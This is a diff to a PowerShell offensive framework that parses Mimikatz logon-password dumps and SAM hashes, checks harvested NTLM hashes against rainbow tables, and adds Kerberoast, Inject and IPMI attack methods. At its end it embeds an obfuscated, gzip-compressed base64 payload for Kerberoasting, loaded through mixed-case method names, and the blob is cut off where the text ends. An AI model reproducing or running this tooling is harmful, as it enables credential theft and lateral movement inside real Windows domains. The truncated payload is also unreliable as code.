+        Get-Content "$SAM\.SAM-Full.txt"
 
         Write-Host ""
         Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
         Write-Host ""
     
         if ($Rainbow) {
-            RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.Sam-Full.txt"
+            RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.SAM-Full.txt"
         }
     }
-
 
     ################################################################################################################
     ################################################# Function: Parse-LogonPassword ################################
@@ -4981,11 +5821,12 @@ public class Advapi32 {
         Write-Host
         Start-Sleep -Seconds 1
 
+        if (-not (Test-Path -Path "$LogonPasswords\.AllUniqueNTLM.txt")) { New-Item -Path "$LogonPasswords\.AllUniqueNTLM.txt" -ItemType "File" -Force | Out-Null }
+
         function Parse-LogonPassword {
             param (
                 [string]$raw
             )
-
 
             $userInfo = @{}
 
@@ -5051,16 +5892,10 @@ public class Advapi32 {
             }
         }
 
-        # Directory path where the text files are located.
         $LogonPasswordPath = "$LogonPasswords"
-
-        # Retrieve all text files from the directory.
         $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt
-
-        # Create DirectorySearcher object outside the loop
         $Searcher = New-Searcher -domain "$Domain"
 
-        # Loop through each file in the directory.
         foreach ($File in $Files) {
             # Extract computer name (DNS Hostname) from the file name using regex.
             $Computer = $File.BaseName -replace "-LogonPasswords$", ""
@@ -5069,12 +5904,9 @@ public class Advapi32 {
             Write-Host "-[$Computer]-"
             Write-Host
 
-            # Retrieve the content of the current file.
             $FileOutput = Get-Content -Raw -Path $File.FullName
 
-            # Parse the Mimikatz output and include ComputerName.
             $ParsedResults = Parse-LogonPassword -raw $FileOutput
-            # Update each user's notes if they have an AdminCount of 1
             foreach ($user in $ParsedResults) {
                 if ($null -ne $user.Identity) {
                     $username = $user.Identity.Split('\')[1]
@@ -5161,9 +5993,6 @@ public class Advapi32 {
             RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
         }
     }
-
-
-
 
     ################################################################################################################
     ################################################# Function: Parse-eKeys ########################################
@@ -5275,8 +6104,6 @@ public class Advapi32 {
         }
 
     }
-
-
 
     ################################################################################################################
     ############################################## Function: Parse-KerbDump ########################################
@@ -5529,7 +6356,6 @@ public class Advapi32 {
 
     }
 
-
     ################################################################################################################
     ################################################ Execute defined functions #####################################
     ################################################################################################################
@@ -5545,12 +6371,15 @@ public class Advapi32 {
         "SessionHunter" { Invoke-SessionHunter }
         "Spray" { Method-Spray }
         "VNC" { Method-VNC }
+        "Kerberoast" { Method-Kroast }
+        "Inject" {}
+        "IPMI" { Method-IPMI }
         
         default {
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Invalid Method specified"
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, Kerberoast, Inject or IPMI"
             return
       
         }
@@ -5613,5 +6442,22 @@ function Invoke-RDP{
     $capturedOutput = $stringWriter.ToString()
     $capturedOutput
 
+}
+'@
+
+$Global:rst = @'
+function Invoke-Kroast
+{
+    $kr=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG("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